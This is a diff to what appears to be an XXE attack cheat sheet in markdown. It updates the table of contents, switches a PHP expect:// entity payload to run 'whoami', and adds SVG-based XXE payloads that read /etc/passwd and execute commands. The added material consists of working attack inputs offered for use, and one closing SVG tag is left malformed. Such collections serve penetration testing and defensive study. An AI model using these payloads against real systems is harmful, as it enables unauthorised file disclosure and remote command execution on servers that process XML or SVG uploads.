@@ -17,9 +17,10 @@ XXE (XML External Entity) attacks are vulnerabilities that arise in applications
    2.2. [XXE to SSRF](#XXEtoSSRF)<br>
    2.3. [XXE to RCE](#XXEtoRCE)<br>
    2.4.  [XXE to DOS](#XXEtoDOS)
-6. [Blind on request](#BlindXXE)
-7. [Bypass XXE](#XXEBypass)
-8. [Out-Of-Band](#OutOFBand)
+3. [XXE in SVG](#XXEsvg)
+4. [Blind on request](#BlindXXE)
+5. [Bypass XXE](#XXEBypass)
+6. [Out-Of-Band](#OutOFBand)
 
 ---
 
@@ -70,7 +71,7 @@ Abusing the expect module of php to execute commands (It is required to have thi
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [ <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "expect://id" >]>
+   <!ENTITY xxe SYSTEM "expect://whoami" >]>
     <checkproduct>
        <productId>&xxe;</productId>
        <storeId>2</storeId>
@@ -97,6 +98,20 @@ Cause a denial of service by repeatedly calling entity's functions
 ```
 ---
 
+### XXE on SVG <a name="XXEsvg"></a>
+**File inclusion**
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+   <image xlink:href="file:///etc/passwd"></image>
+</svg>
+```
+**Using the PHP "expect" wrapper**
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://whoami"></image>
+</svg
+```
+---
 ### XXE blind on request <a name="BlindXXE"></a>
 **See if there is an XXE without it being seen in the request**
 
